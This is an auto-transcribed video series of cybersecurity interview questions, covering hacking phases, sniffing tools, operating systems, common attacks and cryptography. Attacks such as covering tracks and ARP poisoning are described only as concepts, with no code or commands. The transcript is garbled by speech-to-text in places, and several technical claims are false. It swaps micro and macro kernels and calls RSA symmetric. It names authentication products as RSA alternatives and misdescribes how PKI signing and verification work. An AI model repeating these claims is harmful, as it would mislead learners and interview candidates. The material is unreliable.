classified in five different steps
which are quite generic right so the
first step will always always be the
recognizance step
also known as
information gathering phase also known
as footprinting or fingerprinting
depending on what exactly you're doing
but in this phase
the attacker gathers all the evidence
all the information that is possible
about the targets that they want to
attack
so here you're trying to get to know the
victims so you can launch specific
attacks towards them you want to
identify what operating system they are
utilizing what ip addresses mac
addresses the versions of the operating
systems and applications the patch
levels find out vulnerabilities find out
whatever information is possible find
out the information about the
person who is using those computers so
you can launch social engineering
attacks and so on so forth so the first
step is all about gathering enough
information based on which you can
launch further attacks
once you have that information comes the
second phase which is known as the
scanning phase
this is more of a technical phase so you
have
in the first step you've got your ip
addresses domain names maybe even
network maps and you have identified
which devices are available now in the
scanning phase you're going to identify
live devices
and then you're going to scan them for
open ports processors protocols services
you're going to identify vulnerabilities
you're going to enumerate them to
identify more information from them
thus at this point in time you will have
identified a certain set of
vulnerabilities or a certain set of
security loopholes that you can misuse
once you have identified those
you are going to the next step which is
the gaining access state
in this you're actually going to execute
your attacks based on the
vulnerabilities that you have found and
you're either going to gain access to
that particular system by installing a
trojan or a destroyer system by
installing a virus or install a spyware
or a keylogger whatever you wanted to
achieve so in the gaining access phase
you would have
based on the knowledge that you gain in
the first and the second phase you're
going to launch your attacks and you're
going to try to gain access to that
particular
then the next step is where you're going
to maintain that access now that you
have hacked into that device it is not
necessary that you will always
be able to get access to that device uh
suppose you have cracked the password of
that particular user and the user
changes that password after a few days
your attack is worthless so what you're
going to do here is you're going to
maintain your access
so this is
where it is assumed that you want
repeated access to that device and thus
you're going to install a key logger or
a trojan or some mechanism which will
still allow you to get access to that
device without the knowledge or the
authorization of that particular user
and finally the last step is where
you're going to cover your tracks so
whatever activity that we have done so
far will
have created logs and will have created
information
based on which the victim will come to
know that they have been compromised and
may be able to trace that activity back
to you
so to prevent the user or the victim
from realizing that they have been
hacked and to prevent them to discover
who has hacked them
you want to cover your tracks by
deleting logs and any references that
point to that particular activity you
are going to hide the files that you
have created so you've installed a
trojan or a key logger
these will create files and directories
you're going to hide them so that they
are not discovered you're going to hide
processes that have been created you're
going to try to hide all the activity
that you have done so that to conceal
the actual attack
and preventing the user from realizing
that they have been compromised
so these are the five steps that will be
involved in hacking a server network
application or any computing device
you'll come across the next question
refers to what are the various sniffing
tools now this is a network-based attack
where you're trying to capture uh data
packages that that are being transmitted
over the network and then you're going
to analyze them to see if you can
capture any sensitive information like
usernames passwords bank details or any
anything of that sort now these tools
will also depend on which operating
system you are utilizing for example msn
sniffer would work on microsoft
operating systems eater cab would be
based on linux and so on so forth so on
the screen you'll see six different
sniffing tools that work on different
operating systems wireshark is uh
something that is common both on windows
and
linux it is used to analyze network in
detail it is the de facto tool that you
will come across in most of your ethical
hacking trainings in most
of your organizations when they want to
do
data captures
now data capturing or packet capturing
is not only done by hackers to gather
more information but it is also a known
troubleshooting technique used by
administrators and network
administrators to analyze any issues
that may be going on in the network
right so while the first tool you see on
the screen is wireshark like we stated
is available for windows linux
as well
then there is tcp dump which again has
the same capability of wireshark but is
a command line version whereas wireshark
also has a gui a graphical user
interface
tcp dump is available on linux
msn sniffer it's a very old tool uh
when we had msn messengers
msn messenger is no longer there but
microsoft does or did have a microsoft
message analyzer tool uh which they have
stopped development since 2015
but that's another tool that is specific
for microsoft operating systems from
microsoft that can be installed to
gather more information then you've got
ethercap which is
a tool to launch management attacks data
capturing and is is essentially a linux
command line based tool
then d sniff is another password and
network capturing tool which can help
you capture data packets prominently a
linux
two
same with eatery
this is a graphical tool which will
allow you to
capture data data traffics and map
protocols and identify which ip
addresses have been communicating with
what essentially all of the tools have
similar functionality except that uh
some have additional functionality like
launching management attacks or
capturing or having specific filters
that will help you identify and
troubleshoot some network issues that
you may be facing moving on to the next
question what is an operating system now
this is a very difficult question to
answer because uh
we normally when we want to answer this
question we start off with the
functionality of an operating system
right uh we try to describe what windows
does or what linux does or what mac os
does and then we are trying to figure
out what an operating system is in the
first place but an operating system
essentially as the slide says is a
software program that provides a
platform for computer hardware to
communicate and operate with the
computer software so it is basically an
enabler for human interaction with the
hardware that you have if you take the
operating system out of the question
it's just some hardware which cannot
interact with you
but essentially when you have operating
system like microsoft windows or linux
or mac
you're essentially essentially
installing an instruction set on that
particular device which will allow you
to interact
and manipulate the hardware to do
whatever you want that hardware to do
right essentially when we talk about
drivers for your various devices like a
driver for your lan card or for your
sound card or for your graphics card
which allows you to tweak these cards
for functionality right
it allows us input and output functions
uh
for example the basic example you open
up microsoft office products like
microsoft word or excel and you get a
gui on the screen
which you can interact with you got a
keyboard and you type on that keyboard
and the computer knows what you're
typing and reflects those
actions on the screen by showcasing it
on that particular
excel file or a word file so how does
the computer know what to do or what
you're exactly intending to do at this
point in time it is all the operating
system that is providing you all these
services analyzing what your inputs are
and then based
on the programming it is going to
execute that and show it to you on the
screen
right some of the most common commonly
used operating system are microsoft
windows you have them in desktop as well
as server variants
unix
linux again linux desktop and servers
you've got ubuntu and linux red hat and
so on so forth and then you've got mac
os
for
apple related components the next
question what is the difference between
micro kernel and macro kernel the first
thing we need to know is what is the
kernel kernel is the
heart of the operating system that
allows that input and output to happen
it allows those drivers to be set up so
that the hardware can interact with the
software and we can then instruct the
software and the hardware both
to function in a particular manner
so there are two types of kernels micro
kernels and a macro kernel micro kernel
is something that we normally use micro
kernels are for operating systems that
use processors directly handled by the
processor
the micro kernel is very small in size
micro kernel is large because it
basically is an entire image of the
operating system
the execution for a micro kernel is slow
the micro kernel is going to be faster
because it is more evolved
there's a lot of programming involved
extendability
micro kernels are easy to extend micro
micro kernels are hard to extend as far
as security is concerned if a micro
kernel crashes it takes everything down
with it the entire operating system is
going to crash but in case of a micro
kernel it is only that particular
process that is going to get affected
micro kernel there is a lot of coding
involved
micro kernel less coding is involved
examples of microkernels would be simply
an oss most popularly used on yesteryear
phones nokias if you remember those
uh qnx and so on so forth micro kernels
your linux or bsd operating systems
essentially use macro kernels
next question what are the different
types of operating systems
so as you can see on the screen
five types of operating systems batched
os distributed operating systems time
sharing multi-program and real-time what
are batched operating systems the
computer operator places the jobs coming
from input devices into batches
so
consider this not from a desktop
perspective but from a server
perspective where these devices are used
by organizations to compute and to
crunch some processes that is going to
make some business sense out of it so
when there are multiple processes coming
in multiple jobs that are going to be
scheduled a batch os is going to place
these jobs in batches and they're going
to crunch those
based on the
inputs that have been given by these
operators distributed oss where there
are multiple computers which are
interconnected and are communicating
through networks so in a corporate
environment you don't use one single
computer to do everything you've got a
data center and the data center will
have a cluster of servers where they're
going to share some resources to crunch
one particular task right so that's
where your distributed os is coming to
the picture
then you have time sharing oss where you
are renting some type so time sharing
voices minimizes the response time
example in today's world cloud right uh
you go on to the cloud you have a
virtual service over there
you schedule something you showed you
the job over there it is uh it is
executed
and for that time being that operating
system services your particular request
and provides you that particular job
any application that you see online that
is executed for example facebook
from a consumer's perspective
could be a time shared experience then
multi-programmed os the operating system
uses cpu scheduling to separate jobs so
you're scheduling the cpu to complete
certain jobs
in this particular manner and in real
time os the operating system uses
maximum time to critical operations so
it identifies
the priority of these operations it
knows the high priority items the medium
low priority items and based on that it
is going to execute these critical
operations and get the job done moving
on to the next question what is the
difference between logical address space
and physical address space now
when you're looking at address spaces
this is where applications come into the
picture and when you execute an
application it is going to create a
particular address in the memory where
it is going to create a buffer to store
its own information so that it can be
provided to the processor processed and
then can be returned back to the
application as an output
right so
as far as definitions are concerned a
logical address is generated during
running of an application
or a program a physical address is a
physical address or a physical location
on the memory module itself
right
visibility you can view a logical
address because it is programmed into a
computer so if i'm looking at cc plus
and i'm using malloc or memory
allocation
that's where the logical address is
going to be created where a buffer is
going to be created for that program and
whatever the user include is going to be
it's going to be stored in that buffer
but whereas physical addresses are
concerned this logical address will be
created on a physical store
or a physical memory module
which will have its own addressing
mechanism thus you you can see the
memory module but you cannot see the
specific address on that particular
memory module but as far as
a logical address is concerned by your
programming or your debugging the
application it will show you the logical
address that has been created the start
point and the end point of the logical
address that has been created for that
particular program it can be shown in a
debugging environment
right
address space logical and physical
addresses physical like here this case
it's the memory module itself you can
access only the physical address on that
particular memory because logical
addresses can be viewed but you cannot
access them physically uh generation uh
the logical addresses are generated by
the cpu uh during the processing time
whereas physical addresses are generated
are computed by the memory management
unit or the mmu that you have on your
computers
and as far as logical addresses they
will always be they are variable whereas
the physical address is always going to
be constant looking at the next question
what is the difference between logical
address space and physical active space
so moving on from the previous question
to this
the logical address is
a address created by the cpu for the
processors that need to be addressed and
that can be stored as a buffer in the
physical memory whereas the physical
memory itself is going to be a address
that is going to be there on the
physical part of that memory which is uh
which is going to be assigned to it by
the mmu then the next question discusses
uh shells so what shells are used in
linux now what is the shell shell is the
command line interface that we utilize
on a linux machine so the terminal
window as we call it
is a shell
and there are different variations of a
shell based on what linux operating
systems you're using the desktop
operating systems that you use uh or the
server operating systems and real in
today's world that you're going to use
normally will always have a bash shell
which is the first shell that you see on
the screen known as a bone again shell
it is a default for linux distribution
so as far as end consumers
regular consumers are concerned it is
always going to be a bash shell a bone
again shell that you're going to utilize
for scripting and to execute regular
commands
but when it comes to high level
programming or it comes to
specialization tasks then you've got the
rest of these
shells that you can utilize for example
the ksh known as a con shell is used for
high level programming
which supports associative arrays and
built-in operations the csh or the c
shell
uh has different functionality like
spelling corrections and drop controls
the zsh or the z shell
provides unique features like file
generation startup files
and fish friendly interactive shell
which provides features like auto
suggestions and configuration so all of
these have different functionalities
depending on what usage that you have
for that particular shell the most
common shell like i stated is the bash
shell that you'll always come across in
your desktop linux operating systems
then looking at the next question what
are the process states in linux now what
is a process process is basically a
service that is running
for a particular application for that
application to function right uh this
process is going to direct user input to
the processor process it
get that output back to the application
execute it and then show it onto the
graphical user interface for the user so
in linux there are five states for a
process first is the ready space now in
ready
in this state the process is created and
it is ready to run so it is waiting uh
it is waiting for input it's ready uh
the application is executed
the running is when the process is being
executed itself blocked or wait is when
user input is being looked upon so it's
waiting for user input
so that it can do the processing
completed or terminated it has completed
its execution or was terminated by the
operating system for some reason or the
other so this is where things have
uh the processing has been completed
and then lasted state is zombie where
the process is terminated but the
process table still holds the
information uh maybe it is waiting for
the kill request before it gets
terminated
so these are the five states for a linux
process to be in and that brings us to
the ten questions in the operating
system and application space in the next
video we'll be looking at ten more
questions on cyber attacks interview
questions based on cyber attacks
let's start off with the first one the
first question is what is sql injection
sql stands for
structured query language which is a
language that is used by most of your
databases or your relational databases
the variations of your database would be
mysql microsoft sql
oracle sql
you'll have ibm databases all of these
databases utilize the structured query
languages to interact with the
applications now all of these databases
have their own syntax so you'll have to
study most of these databases based on
which applications and which databases
you want to provide security for
but as the name suggests sql injection
vulnerability or structured query
language injection vulnerability
is where a user can maliciously inject
a sql input
or a sql statement in a query
send it to the database and evoke a
response response out of it
so this vulnerability is not
specifically to the database it uh the
vulnerability lies more in the
application and the coding of that
application so when the application
receives a query which it needs to be
forwarded to the sql uh database
we need to configure at the application
level of what queries are allowed and
what queries are not allowed so there
are different various aspects
of how to manage a sql injection
vulnerability but the basic flaw lies in
the application where uh invalidated
input is accepted and sent forward to
the database where the database might
confuse it into an executable statement
and thus create a
response that was not warranted
there are various types of sequel
injections as shown on the screen in
band sql injection where you can look at
an error based or a union based
injection a blind sql injection where it
is either boolean based or a time-based
attack and then an out-of-bound sql
injection
essentially you're looking at databases
and you're looking at application
security however you want to encourage
secure coding practices so in
unvalidated input is mitigated
the next question is what is spoofing
now in spoofing you're basically
assuming the identity of another person
so here the attacker pretends to be some
other person or an organization and
sends you an email that appears to be a
legitimate email it looks almost genuine
it has been constructed to replicate
what a genuine email would have been
and it is very difficult to spot
a fake one
there are different ways to identify
whether email is genuine or not
but that's for a different video
moving on to the next question what is a
distributed denial of service attack or
a ddos attack now generally a denial of
service attack is an attack where
legitimate users are prevented access to
the resources that they legitimately can
access right so for example if it is a
bandwidth-based attack
the attacker consumes the bandwidth of
the network in such a way that there is
no more bandwidth left for legitimate
users to access the network
now a single device may not be able to
generate that much amount of
uh traffic to consume the bandwidth of a
huge server thus the attacker will
construct a botnet
and through that botnet they will launch
a distributed denial of service attack
to the target victim
right so a botnet uh there are two
terms that you want to look at over here
the first term is a bot and the second
one being the botnet itself bot is a
software that once installed on a
victim's machine allows the hacker to
send remote commands to that machine
that will
make it to generate some activity
once we have enough machines
on which such bots have been implemented
the collection of these machines would
be known as a botnet
so an attacker would then instruct this
entire botnet to start generating data
traffic to be to be sent to the targeted
network or to the targeted server which
will then bog down the server
thus crashing it and preventing users
from accessing that particular resource
the next question is how to avoid our
poisoning or arp now first let's
understand what arp is arp stands for
address resolution protocol which is a
protocol used by computers to
communicate over the network once your
computer boots up
it starts a discovery process of
identifying its neighbors so if i'm in a
particular subnet
my machine will proactively send out arp
request an address resolution protocol
to find out which other machines are
within the same network
and which are live once it sends out a
query a live machine will respond to
that query along with its mac address
this information is then
stored in what is known as a arp table
or an arb table on the machines cache
so whenever my machine now wants to send
out a packet to this particular machine
it will go to the arp table it will
identify the ip address and the
associated mac address it will print
that onto the data packet as a
destination uh iep and destination mac
and send that packet across to the
switch the switch will then identify the
mac address and send the packet to the
relevant machine that is connected to
that particular switch
now to confuse the switch into sending
it to a different machine
our poisoning attack is created this
attack is generally launched to
create a man in the middle attack
now to prevent this our poisoning from
happening in the first place there are
three different aspects that we can
utilize first we can use packet
filtering
which will filter out and block packets
that are the same source address data so
you have identified some malicious ip
addresses and you want to block out some
ip addresses so you're using a packet
filter firewall where you have
constructed the firewall to filter out
certain packets
originating from particular range of ip
addresses this firewall and this
technique will then block those kind of
packets coming in
second keeping away from trust
relationships organizations will develop
protocols that do not depend on trust
relationships and thus you want to
keep this protocol away from that once
you have created a trust relationship
uh these machines should not be sending
out arp requests to other machines in
the first place since uh that
translation has been has been defined
and these machines know whom to
communicate with such kind of protocols
should then be disabled
or you can use arp spoofing software so
there are some there are software's out
there that will look for arp spoofing
and prevent that from happening in the
first place so if somebody has sent out
a spoofed arp packet
that packet will be picked up by this
software
and it will be mitigated of
network visualizers like glass wire anti
viruses like so force
they haven't built capabilities of
identifying uh our up spoofing attacks
and mitigate them in the first place in
the next question we are going to
discuss what is ransomware
now ransomware is a type of malware that
blocks victims to access personal files
and demands ransom to regain access
there are three categories before we go
into the categories let's just revisit
what ransomware is let's start with the
word malware malware is a malicious
software that poses as a legitimate
software but has a payload that will
have a security impact on your machine
so in this instance uh viruses trojans
all of these can be classified under
malware so can ransomware but trojan is
a software that will give you a back
door access to it to a particular device
a virus will do some destructive
activity on that device a ransomware
will basically encrypt the data of that
particular user from on that particular
machine thus rendering that that data
inaccessible to the users themselves
and in turn will demand the ransom to
provide access to that particular data
so the three types of ransomwares the
first one is scareware
which uses social engineering to cause
anxiety or the perception of a threat to
manipulate users into buying unwanted
software so this preys on the
gullibility of humans
where you can see a pop-up appearing on
your screen which can scare you into
believing that you may have been
attacked or there is a virus on your
machine and then instructs you to
download a particular software to
mitigate that particular virus now
the malware will be in this software
that you will be downloading and then a
ransomware will be installed and your
data will be encrypted
screen lockers uh where
locking uses computers by preventing
them from logging in and displaying an
official looking message you will see a
screen saver once you boot up which
prevents you from accessing the login
page so it will not allow you to log
into your own machine but it will give
you a warning that your data has been
encrypted and you need to connect to a
particular email address and send bit to
send bitcoins over there
to get a decryption key to access your
own data and then the encrypting
ransomware displays a message demanding
payment in return for the private
asymmetric key which is needed to
decrypt the symmetric keys for encrypted
file so once your files have been
encrypted you might just have a blank
screen in front of you where you'll
receive a warning message uh where it
instructs you to pay up a ransom in
bitcoins or in some cryptocurrency to
some particular digital e-wallet which
is not traceable and once you make that
payment they will send you the
decryption key and then you can access
your data if getting your learning
started is half the battle what if you
could do that for free
visit skill up by simply learn click on
the link in the description to know more
then talking about the next question
what is the difference between an active
and a passive cyber attack now when we
talk about cyber attacks cyber attack is
activity that is caused by a malicious
user who wants to try to
get access or do some security incidents
on the victim's devices so there are two
ways that can happen it's either in an
active manner or a passive manner in an
active manner the intruder attempts to
disrupt a network's normalcy modifies
data and tries to alter the system's
resources so this is more active where
the attacker will proactively
try to
destroy the network so that
communications fail or they might try to
modify the data where uh we're using a
ransom where they can encrypt it or they
might delete that data using a virus or
steal that data using a trojan or they
might even alter the data uh so that it
is no longer trustworthy whereas in a
passive attack the intruder intercepts
data traveling through a network here
the intruder eavesdrop but does not
modify the message so they're just
listening in they're just observing what
is going on they are not manipulating
the data they are not stealing anything
it's just that they are monitoring the
activity that's going on the next
question what is a social engineering
attack now social engineering attack is
a people based attack the victim here is
the human by itself the vulnerability
also lies in the human it may be
executed through a computer but
end of the day the gullibility is of the
human so it is the art of manipulating
people so that they end up giving up
confidential information
now we always read in the papers where
somebody got manipulated their passwords
got hacked and somebody's life savings
got wiped out
right because they shared the otp with
someone or they shared a
the password with someone now creating a
scenario where these people will fall
prey to this attack and share this kind
of personal information
to unknown people that is where the
social engineering attack comes in
creating that scenario which will ensure
that these people give out this
confidential information
now there are three categories in this
attack one the first one is a phishing
attack second is a sphere phishing
attack and a third is a railing attack
now phishing attack is basically a
generic attack
it is targeted to the world at large
whoever falls prey to that attack
will be a victim
whereas a spear phishing attack is a
targeted attack towards a specific
individual or a group of individuals or
towards an organization so there is a
lot more research that goes into
spearfishing where you analyze the
victim you try to figure out what their
vulnerabilities are and you tailor make
or you customize the attack
to that
particular vulnerability once you have
that attack you launch it against those
people those people
will then fall prey to this attack an
availing attack is where you're
attacking
top level executives so the c-level
executives of an organization
politicians movie stars wealthy and
powerful people
so any of these people when they're
attacked it will be known as a whaling
attack
next question what is man in the middle
attack now this is something that we had
touched based when we talked about arp
where the arp poisoning attack needs to
be executed to leverage a man in the
middle attack now in the man in the
middle attack
the attacker attacking computer takes
the ip address of the client unaware of
this the server continues to communicate
with the attacker now if you remember in
a previous question we have also talked
about spoofing so in this scenario
attacker has spoofed their iep address
to replicate themselves as a genuine
client
and now with that spoofing in mind they
might either through our poisoning
attack or just because of the spoofed ip
address become a man in the middle that
means that they are now
each dropping on the conversation
between the actual
client and the server by posing
themselves as a server in this scenario
the attacker is now
a go-between between the client and the
server and can eavesdrop and can copy
the data if they want they can modify
the data as well so as you can see on
the screen the attacker becomes man in
the middle which means that they are now
eavesdropping on the conversation that
is happening between the client and the
server the next question
who are black hat hackers and white head
hackers the main thing is the
differentiation between a black hat
hacker and a white hacker now our black
hat hackers are skilled individuals
who illegally hack into a system the
motive behind such an attack is mostly
for monetary gain these individuals are
known also known as security crackers
now if you look at your criminal hackers
those who have malicious intent those
who do hacking for the intent of
personal gain or for the matter of
disruption the main thing that black hat
hackers
lack
is authorization they are not authorized
to do the activity that they are about
to do and they are going to get
unauthorized access to devices or to
data which is going to cause losses to
the organization involved
whereas on the other side a white hat
hacker
are also known as ethical hackers
these are the individuals who discover
vulnerabilities in a computer network
and they help the organizations mitigate
these vulnerabilities they help the
organizations defend themselves from
blackhead hackers so the main difference
between these two types of hackers a
black hat and a white hat is the intent
and the authorization so black hat
hackers will have malicious intent they
will try to personally gain from that
attack
from by finding out vulnerabilities they
also will not have authorization to
conduct whatever activity they are doing
whereas on the other side whitehead
hackers will be hired by organizations
they will provide authorization for
certain activity that the whitehead
hacker can do
to find out those vulnerabilities once
those vulnerabilities have been found
out found out by the whitehead hacker
they will report it to the management
and guide them in implementing security
controls to mitigate those
vulnerabilities the main difference
between a black hat and a white hat is
the authorization and the intent the
next question what are honey pots
now honey pots are
a very interesting
device that can be introduced in a
network uh these basically are decoy
servers that are implemented in a
network to attract the attention of our
it is there to lure an attacker
into
attacking that particular device
thus creating a security blanket blanket
for the rest of the devices
so if an attacker has been able to
bypass a firewall and is now trying to
scan a particular network when they scan
they will come across various devices
that are there in the network they will
then proceed to do a vulnerability scan
on these devices the honeypot at that
point in time will provide as an approve
as an attraction to these attackers
because it will
demonstrate some vulnerabilities to the
hacker which will divert their attention
so these vulnerabilities are simulated
on these devices these actually do not
exist
but the moment the attacker then starts
interacting with the honeypot the
honeypot will identify that as a
malicious traffic and will warm the one
the administrator about a possible
attack that is going on the
administrator will then investigate
through the honeypot of what activity is
going on and then reconfigure the
security controls to block the attacker
or mitigate the attack itself right so
it is more of a decoy server
that will showcase or simulate some
vulnerabilities to an attacker thus to
lure them
and safeguard the rest of the network
these are the 10 questions for
cybersecurity in the next video we'll be
talking about cryptography the first
question define cryptography encryption
and decryption now cryptography
is used by security professionals to
scramble data
into non-readable format
which is used in securing that
information
so it involves converting data from a
readable format into a non-readable
format and then reversing it back to
readable format again
for example the word computer is now
scrambled into looking like a unreadable
format now if you look at this word that
it has been scrambled into it would be
very difficult
for a human to figure out
what the actual world was
now in this scenario we have taken an
algorithm where we have made a
shift of the alphabet
where we have added two alphabets the
current one so c plus two becomes e
o plus two becomes q m plus two becomes
o so we have done a shift of two and
thus the key over here for this
algorithm
is the alphabet plus two so any person
who figures that out will be able to
unscramble this and convert this back
into readable text
the fact of scrambling a readable text
data into something that is unreadable
by using a particular key is what
cryptography is all about
now as we discussed the decryption again
is
replacing the alphabet and taking it
further back by two characters so e
minus two becomes c q minus two becomes
o
o minus two becomes m and so on so forth
so anybody who knows this key uh the
shift key
anybody will able to decrypt this
particular character so this depends on
the user if i want to utilize alphabet
plus five then the spacing the shifting
of that character will be the fifth
character from that particular character
and so on so forth
the next question what is the difference
between ciphertext and cleartext
ciphertext refers to the text which is
encrypted and totally undesirable
the message received after decryption is
known as clear text this text is
comprehensible so the word computer is
clear text that means that it has not
been treated to any cryptographic
measures it does what it is intended to
be
however if the moment we encrypt it that
means we scramble it into unreadable
text by using any of the algorithms that
we'll be looking at
that text is known as a cipher text
and without the key this becomes
unreadable
the clear text as discussed is the plain
word that we have utilized we are using
the english language in this instance so
the plain word computer is the clear
text once we add the encryption layer to
it
we get the cipher text to it
moving on to the next question what is a
block cipher
this refers to the method of encrypting
the plain message block by block the
plain message is broken down into fixed
size blocks and then encrypted now a
block cipher is normally used for data
that is stored so a data that is stored
on a hard disk and we want to encrypt
that data that is known as block
encryption or a block cipher so a block
cipher is an algorithm
that will allow you to encrypt data that
is stored onto a hard disk so in this
example we've got
uh plain text which is 64 bits in size
and we have
added a layer of encryption to it so
plain text plus the key that we have
studied in the previous questions and
then the scrambled data out of it which
is unreadable and thus encrypted then
the next question what is public key
infrastructure now the public key
infrastructure is a set of policies
which secures the communication between
a server and a client it uses two
cryptographic keys public and private
so
the infrastructure itself is a set of
policies people procedures and
techniques which are standardized in
nature
and are globally accepted
which allow us to use digital
certificates to encrypt data and decrypt
the data
uh at the other end
we use asymmetric encryption over here
which means that we are used two keys
one is a public key to encrypt and the
private key to decrypt
the other part of your encryption is a
symmetric encryption where the same key
is used to encrypt and the same key is
used to decrypt
now in a public key infrastructure
like i said we have standardized that so
in the standardizing part of it these
are the various players that have been
defined in the public key infrastructure
the first is this
user or the sender in this scenario the
one who requires this digital signature
to digitally sign a particular
transaction or a communication a
registration authority with whom they
are going to register for that
particular key the certification
authority who issues that key
the verification of authority who
validates the
key itself and the recipient who is
going to be the other party of that
particular transaction so how is this
utilized
a sender or the user who requires this
digital signature will request or apply
for a digital signature with the
registration authority the registration
authority would validate the
genuinely of the user so they might do
some
identity verification or
proof of residence or something like
that once they've identified the person
and they have validated the information
they will then send the request to the
certification authority stating that the
sender has been validated and we can and
the certification authority can issue
the digital certificate to the
particular user
they will send the public key to the
sender which will be utilized by the
sender for further transactions so when
the sender
is going to sign some data and wants to
send it across to the recipient they
will use the public key to sign it and
send it across
the recipient will then validate with
the verification authority to see if the
data the signed data is correct or not
now
while
the certification authority sends the
public key to the sender the
certification authority updates the
private key with the verification
authority so whatever is signed by the
sender uh received by the recipient and
they want to validate it they will send
it back to the verification authority
the verification authority will validate
using the private key once the private
key is validated
it will then send the okay signal back
to the recipient thus allowing the
validation of that particular
transaction
if the signature is tampered with or is
not the very fiction authority is not
able to validate the signature it will
then send a denial message back to the
recipient and the transaction will
not go through
so the pka enables trusted digital
identities for people so the pki grants
secure access to digital resources based
on the infrastructure that has been
created and the core of the pki is a
certification authority which ensures
that the trustworthiness of the digital
data is
ensured
so
going back to the previous slide
these are the key players that have been
standardized in the public key
infrastructure the certification
authority is the authority that issues
the digital certificates the validation
authority is the one who validates that
digital certificate
moving on what is rsa
rsa is one of the first public key
crypto systems that is used for secure
data transmission it stands for reverse
xiaomira and edelman now these are the
three people who have created this
algorithm randy west adishamir and
leonard edelman who are the inventors of
this technique it is a symmetric
cryptography algorithm which works on
both public and private keys hence the
encryption key is public and the
decryption key is kept private now as we
have discussed earlier symmetric and
asymmetric cryptography symmetric
cryptography is where the same key is
used to encrypt and decrypt whereas
asymmetric cryptography is where there
are two keys to encrypt and decrypt the
algorithm what are the few alternatives
to rsa now rsa is an algorithm that is
used for encryption there are a lot of
other algorithms that can be utilized uh
to alter or to scramble data depending
on your requirements so in the previous
question we have studied and we have
talked about what uh rsa is it stands
for uh reverse xiaomi and edit method 3
creators of that particular algorithm
but there are a lot of alternatives to
this algorithm depending on how secure
you want that data to be
and some of them are
listed here on your screen duo security
octa google authenticator and lastpass
lastpass is a password manager
so is dual security google authenticate
is something that we all utilize it is
an application that we can download and
store on our mobile devices and we can
set that up to authenticate ourselves
with certain portals so it issues a
unique id to us
which once
utilized will allow us access to those
particular portals octa is an identity
manager where you have created different
digital identities and you have assigned
them certain permissions and based on
your authentication mechanisms octa will
allow or disallow access to those
different applications or different
portals as you have configured it so all
four
are
authorization authentication mechanisms
which can be used as alternatives to rsa
if getting your learning started is half
the battle what if you could do that for
free
visit skill up by simply learn click on
the link in the description to know more
next question what are the prime
objectives of modern cryptography and
this is a very important question
because we've so far looked at what
cryptography is and what public key
infrastructure is but what is the
achievement out of it why are we
utilizing it and what do we want to uh
gain out of it so the main and the prime
objectives of modern cryptography are
as follows mentioned on your screen the
first one is confidentiality
the second one is non-repudiation
third one is authenticity and the fourth
one is integrity
now if i go back to the first one
confidentiality
that is where i want to keep data
confidential that means it will only be
visible to the authorized users right so
here i've
created a list of people who have deemed
as authorized users and have created a
digital identity to them and have given
access controls to those people now that
is how confidentiality is
ensured so when we want to keep data
confidential we create a list of users
who we are going to allow access to
certain resources and we are going to
define what access controls are to be
utilized what access are allowed whether
they got an administrative access or
user level access and only those
authorized users are going to be uh able
to access these resources that is how we
maintain confidentiality
the next one is non-repudiation
non-reputation is the prevention of
denial of having been a part of a
particular transaction so in the public
key infrastructure that we discussed
where a digital signature was utilized
to sign
a particular transaction
and then sent to the recipient the
sender would not be able to deny of
having originated that transaction
because it was using their
digital certificate thus non-reputation
comes into the picture uh one more
example that we can have here is uh on
our mobile phones when we use sms short
messaging service and we send a message
to
uh to another person the person when
they receive a message the number is
validated by the service operator
and thus the sender cannot
deny having sent that message the sender
at the same time can have a delivery
report sent to them
that the message was delivered to the
inbox of the recipient and thus if the
recipient denies having received that
message the delivery report becomes
proof
of having
that message being delivered to their
inbox thus both the parties cannot deny
of have a of being a part of that
particular transaction
then comes the part of authenticity
now in confidentiality we have created a
digital identity assigned to a
particular person
and we have given them digital
signatures where they cannot deny having
being a part of that transaction but
authenticity is the part where they try
to prove that they are who they claim to
be so if i am claiming a digital
identity
i have to prove that i am that person
who i'm who i'm trying to claim to be
and an example to that is when we go to
our gmail.com websites it first asks us
what is our username our username is
normally our email address which
identifies the account that we are
trying to access right so this account
is confidential because it is only
authorized for a particular person
and once
they identify themselves by identifying
the email address that's when the
authentication part comes into the
picture where it asks for the password
now it has never ever happened that we
just go on to the gmail.com type in a
password and then it figures out which
account we are talking about so the
first step is always the confidentiality
part where we identify which account we
are talking about and then we try to
authenticate as the owner of that
particular account by providing the
appropriate password to that account if
both of these match only then do we get
access to that account and
we are able to make uh whatever
transactions we want to make
now when we are making those
transactions not reputation comes into
the place where all our activities also
being logged so we have identified our
account we have authenticated ourselves
by providing the password so the proof
is there that it is us who are trying to
access it
and then whatever activity we do send an
email receive an email delete something
attach something all of those activities
are logged
and stored as proof of what actions have
been done
so tomorrow if we deny having sent that
email gmail can still prove to us
through those logs that though that that
activity was done by us
and the fourth part is
integrity which ensures that the data
received and sent and
sent by the sender and received by the
recipient has not been modified while in
uh motion
so the integrity part is the
trustworthiness of that data that the
data has not been modified by any hacker
or any other
entity
and is still trustworthy
so these are the four prime objectives
of modern cryptography once i have
scrambled that data
using
my public's uh signature it is only my
private signature that is going to
decrypt it right
using these mechanisms i will be able to
achieve all these four aspects
of cryptography and
security next question what is safer
now safer stands for secure and fast
encryption routine which is also a block
cipher as we have discussed previously
block cipher is a cipher that is used to
encrypt data that is stored
so it has a 64-bit block size and byte
oriented algorithm
safer's encryption and decryption
procedures are highly secure this
technology is widely used in
applications like digital payment card
so when you are using your
a digital
payment gateway to make transactions so
you have you have gone on to an online
portal you want to purchase a particular
item
and then it takes you to another
payment gateway where you have to fill
in your credit card information
sensitive information like your
expiry dates cvv information and then
the otp or the password that you have
created for your particular account now
all of these need to be secured or
highly secured based on pci dss which is
the payment card industry data security
standard so these standards ensure that
certain protocols are utilized to attain
that level of security safer is one of
those block ciphers that is used under
the digital payment gateway
infrastructure next question how does
the public infrastructure public key
infrastructure work
now we have already discussed this in
the previous diagrams we have identified
the key players the certification
authority the registration authority the
end user who requires the digital
certificate the validation authority
who's going to validate it and then the
recipe and the end user with whom the
transaction is going to be
conducted so the first point here is
the request for the digital certificate
is sent to the registration authority
they validate it and then they okay to
the certification authority who then
process the request and the digital
certificate is issued to the person who
has requested it
so when the person wants to conduct that
transaction they use that
digital certificate to sign that
transaction with the end user the end
user validates that with the validation
authority and once validated the
transaction goes through and now the
last question what is the blowfish
algorithm
it is a 64-bit symmetric encryption
algorithm so this is an algorithm that
uses the same key
to encrypt and the same key to decrypt
the same secret key is used to encrypt
and decrypt the messages here the
operations are based on exclusive ors
and additions to on 32-bit words
the key has a maximum length of 448 bits
now this is a little bit technical uh
